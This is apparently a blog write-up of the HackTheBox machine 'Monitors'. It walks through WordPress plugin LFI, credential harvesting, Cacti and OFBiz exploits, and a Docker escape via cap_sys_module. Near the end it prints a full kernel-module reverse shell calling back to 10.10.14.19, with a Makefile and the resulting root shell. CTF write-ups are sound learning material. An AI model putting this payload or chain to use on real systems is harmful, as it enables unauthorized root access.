Monitors is a hard rated linux box hosted on HackTheBox. This box made me use every bit of knowledge I had up until that point of how to take down a linux machine. This box features a docker container breakout as well as hard enumeration for credientials waiting to be found. So far, this box is the longest one I have done and took me a few days to complete it. The effort was well worth for my very first root on a hard machine. Overall this is one of my favorite ones I've done so far.

## Foothold

What is spritz? It's probably some sort of convenience pluggin for wordpress but what is important here is that it is vulnerable.

[This is the exploit](https://www.exploit-db.com/exploits/44544)

We have LFI by manipulating the url so lets test it with `/etc/passwd`

![](https://i.imgur.com/BIy00IG.png)

Okay it definately works. Recall that on the nmap scan, this is an apache2 site. Let's check the default location for the wp-config since according to hacktricks:


> In wp-config.php you can find the root password of the database.
{: .prompt-tip }

![](https://i.imgur.com/qqpXC6L.png)

Nothing is here. Most likely in a different folder. This is usually the default location of a wordpress install but it seems like that isn't the case this time. Let's see where the webroot is then.


> Recall that the 000-default.conf specifies the webroot.
{: .prompt-tip }

![](https://i.imgur.com/P1qh6KM.png)


We have some extra config files within, assuming, the sites-enabled folder.

![](https://i.imgur.com/oRz83Xr.png)


That's why nothing turned up in the /var/www/html folder, it was called wordpress instead.

![](https://i.imgur.com/DeHh8D5.png)

There is also a vhost running under cacti-admin.monitors.htb

![](https://i.imgur.com/A9rTozE.png)


> Take note of the version number: 1.2.12
{: .prompt-tip }

Looks like we have a login page to what is probably some sort of CMS.

With this new info, revisit wp-config.php

![](https://i.imgur.com/y2tcS4O.png)

Creds are indeed in here. Spray against the admin page.

Upon searching for Cacti Version 1.2.12, there is:

A python script to automate SQLI and gain RCE. Use it.

Gained foothold.

## User

The box does not seem to have curl or wget so we have to defer to a different method to grab our linpeas if we want to automate the enumeration. We can use nc instead.

Anyways run it and theres a lot of things that used to work that doesnt work here.
The list:
`sudo -l`, `find / -perm -4000 2>/dev/null`, `pspy64` 
Typically we would usually have some sort of sudo permission we can abuse, maybe a SUID but thats more unrealistic. Pspy64 can catch automated process that run in the back but it did not turn out anything in this case.

Snippet from linpeas:

```
-rw-r--r-- 1 root root 178 Nov 10  2020 /lib/systemd/system/cacti-backup.service
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
```

Enum harder
`cat /lib/systemd/system/cacti-backup.service`
```

sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
```
Seems like the reason why nothing was caught my pspy64 was that the script was not automated to run every so often. In a real scenario, we can't expect a site to get backed up every 5 minutes either. Most boxes on htb that do that are more so trying to get your attention but its not very realistic.

Either way, we have plaintext creds in this script.

From earlier I recall seeing docker related processes running. We see that port 8443 is running listening only from the localhost. Port forward it so we can reach it. Most likely a docker container.

`ssh -L 8443:localhost:8443 marcus@monitors.htb`
> the -L specifies the local port that you are port forwarding and the third argument is the port that its forwarding too on my host.

Now visit the website. Ferox found an many directories but most either errored on visit or has this login page.

This version of OfBiz is vulnerable to [this](https://www.exploit-db.com/exploits/50178). This script autmoates the usage of the tool ysoserial to deserialize and gain RCE into the docker container. Pretty convenient.

![](https://i.imgur.com/OFxb6K8.png)

To set up and run, make sure this is all done in the same directory. Set up the http server on port 80. Set up the listener to whatever port. Run the bash script specifying your ip and listening port.

We are now in the docker contained webserver. After reading hacktricks, what I've learned is that if a docker container is running on high enough privileges, it can be potentially escaped. That being said, first step is to check them.

> Note the "cap_sys_module"
{: .prompt-tip }

With cap_sys_module, it is possible to perform a container breakout. Following this [blog post](https://blog.nody.cc/posts/container-breakouts-part2/), I was able to achieve that by doing the following:

Create a makefile with the following contents:
```
obj-m +=eggvan-shell.o
all:
        make -C /lib/modules/4.15.0-151-generic/build M=/tmp/eggvan modules
clean:
        make -C /lib/modules/4.15.0-151-generic/build M=/tmp/eggvan clean
```
Within lib modules is the kernel build of the machine. This can be found by running "uname -r". The M= is whichever directory you are working with. For me it is eggvan.

Create a kernel module with the contents:
```
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.19/6969 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
This here creates a kernel module that calls a reverse shell to my host on port 6969. I need to create a listener before using the module.

Using an http server, I send these into /tmp/eggvan on the victim machine and run make. Make sure that the makefile is named "Makefile" as it is case sensitive. It may vary from machine to machine.

Run `insmod [filename.ko]` in order to use the kernel module.

```
listening on [any] 6969 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.238] 58860
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# 
```

Once the module is loaded, the listener should have a shell on it and we are done. Pwned :)
